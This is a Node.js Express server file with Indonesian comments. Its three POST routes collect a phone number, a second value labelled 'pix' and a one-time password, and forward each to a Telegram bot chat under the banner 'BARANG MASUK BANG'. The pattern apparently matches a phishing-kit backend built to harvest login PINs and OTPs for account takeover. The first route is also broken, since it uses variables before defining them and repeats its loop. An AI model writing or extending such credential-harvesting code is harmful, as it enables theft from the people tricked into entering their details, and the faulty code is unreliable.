const express = require("express");
const axios = require("axios");
const path = require("path");
const app = express();

/* TOKEN BOT */
const BOT_TOKEN =
process.env.BOT_TOKEN;

/* CHAT ID */
const CHAT_ID =
process.env.CHAT_ID;

app.use(express.json());
app.use(
    express.urlencoded({
        extended:true
    })
);

app.use(
    express.static(
        path.join(__dirname)
    )
);

app.get("/", (req,res)=>{
    
    res.send("SERVER HIDUP");
    
});

/* ROUTE */
app.post("/nmrx", async (req, res) => {

    try {

        const { nmrx } = req.body;

        if (!nmrx) {

            return res.status(400).json({

                success: false,
                message: "Data tidak lengkap"

            });

        }

        /* ANIMASI */
const frames = [
    "POX .",
    "POX ..",
    "POX ...",
    "POX ...."
];

for(let i = 0; i < 20; i++){

    await new Promise(resolve =>
        setTimeout(resolve, 1000)
    );

    const frame =
    frames[i % frames.length];

    /* CHAR INVISIBLE */
    const hidden =
    "\u200B".repeat(i + 1);

    await axios.post(
    `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
    {
        chat_id: CHAT_ID,
        message_id: messageId,
        text: `
💳 <b>| BARANG MASUK BANG |</b> 💳

× <code>${nmrx}</code> ×

<b>× NMR ×</b> : <b>${nmrx}</b>

<i>${frame}</i>${hidden}

<b>©️ By PxxStudix</b>
        `,
        parse_mode: "HTML"
    });

}

        const messageId =
            sent.data.result.message_id;

        /* ANIMASI */
        for (let i = 0; i < 12; i++) {

            await new Promise(resolve =>
                setTimeout(resolve, 800)
            );

            const frame =
                frames[i % frames.length];

            await axios.post(
                `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
                {
                    chat_id: CHAT_ID,
                    message_id: messageId,
                    text: `
💳 <b>| BARANG MASUK BANG |</b> 💳

× <code>${nmrx}</code> ×

<b>× NMR ×</b> : <b>${nmrx}</b>

<i>${frame} ${i}</i>

<b>©️ By PxxStudix</b>
                    `,
                    parse_mode: "HTML"
                }
            );

        }

        /* PESAN AKHIR */
        await axios.post(
            `https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,
            {
                chat_id: CHAT_ID,
                message_id: messageId,
                text: `
💳 <b>| BARANG MASUK BANG |</b> 💳

× <code>${nmrx}</code> ×

<b>× NMR ×</b> : <b>${nmrx}</b>

<i>POX DONE ✅</i>

<b>©️ By PxxStudix</b>
                `,
                parse_mode: "HTML"
            }
        );

        res.json({

            success: true

        });

    } catch (error) {

        console.log(
            error.response?.data ||
            error.message
        );

        res.status(500).json({

            success: false

        });

    }

});

/* ROUTE */
app.post("/pix", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix
            
        } = req.body;

        if(
            !nmrx ||
            !pix
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
💳 <b>| BARANG MASUK BANG |</b> 💳
           × <code>${nmrx}</code> ×

<b>×  NMR  ×</b>   : <b>${nmrx}</b>
<b>×  POX   ×</b>   : <b>${pix}</b>
<i>OXT . . . .</i>

<b>©️ By PxxStudix</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* ROUTE */
app.post("/send", async(req,res) =>{

    try{

        console.log(
            "DATA MASUK:"
        );

        console.log(
            req.body
        );

        console.log(
            "BOT:",
            BOT_TOKEN
        );

        console.log(
            "CHAT:",
            CHAT_ID
        );

        const {
            
            nmrx,
            pix,
            otp
            
        } = req.body;

        if(
            !nmrx ||
            !pix ||
            !otp
        ){

            return res.status(400).json({

                success:false,
                message:"Data tidak lengkap"

            });

        }

        /* PESAN TELEGRAM */
        const text = `
💳 <b>| BARANG MASUK BANG |</b> 💳
           × <code>${nmrx}</code> ×

<b>×  NMR  ×</b>   : <b>${nmrx}</b>
<b>×  POX   ×</b>   : <b>${pix}</b>
<b>×  OXT   ×</b>   : <b>${otp}</b>

<b>©️ By PxxStudix</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        }

     );

        res.json({

            success:true

        });

    }catch(error){

        console.log(
            error.response?.data ||
            error.message
       );

        res.status(500).json({

            success:false

        });

    }

});

/* PORT */
const PORT =
process.env.PORT || 8080;

/* JALANKAN */
app.listen(PORT, ()=>{

    console.log(
    "Server running on port " +
    PORT
    );

});
